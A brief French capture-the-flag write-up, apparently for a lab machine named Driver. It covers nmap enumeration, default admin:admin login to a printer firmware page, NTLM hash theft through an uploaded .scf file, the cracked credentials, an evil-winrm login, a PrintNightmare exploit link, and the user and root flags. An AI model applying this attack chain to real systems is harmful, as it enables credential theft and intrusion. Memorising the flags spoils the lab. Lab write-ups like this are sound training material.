# Target : 10.129.95.238

# Enumeration des ports et services

```js
nmap -sV -sC 10.129.95.238 -Pn 
```


```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 22:32 +0000
Nmap scan report for 10.129.95.238
Host is up (0.23s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-18T05:33:19
|_  start_date: 2026-08-18T05:31:43

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.95 seconds
```


# Enumeration du smb

![](Pasted-image-20260817223625.png)

Access denied

# Enumeration http (80)

![](Pasted-image-20260817223927.png)

```js
admin:admin
```


![](Pasted-image-20260817223958.png)


Recuperation du hash ntlm en uploadant un ficher `.scf` 

```js
tony::DRIVER:d12f9d426a031d9f:05F61227814DC4E4F58EE7DA5C1C6E43:010100000000000000A07E05F62EDD013BCE0B44BA7A3D980000000002000800340052005300440001001E00570049004E002D005400470030004F00370055003900560030004100490004003400570049004E002D005400470030004F0037005500390056003000410049002E0034005200530044002E004C004F00430041004C000300140034005200530044002E004C004F00430041004C000500140034005200530044002E004C004F00430041004C000700080000A07E05F62EDD01060004000200000008003000300000000000000000000000002000001596A06C9F101091477D5ABBD43F011B3EB9A16B0CDC3BAF6688D22F79AA59E40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E0037003400000000000000000000000000
```

# Creds

```js
tony:liltony
```


# Connection avec winrm

```js
evil-winrm -i 10.129.51.241 -u 'tony' -p 'liltony'
```



# User.txt

```js
bee727d6181280c38da65a7f0341a874
```

# Root PoC

```js
https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
```



# Root.txt


```js
9580a0cc93e4c120e12864f25648bfde
```

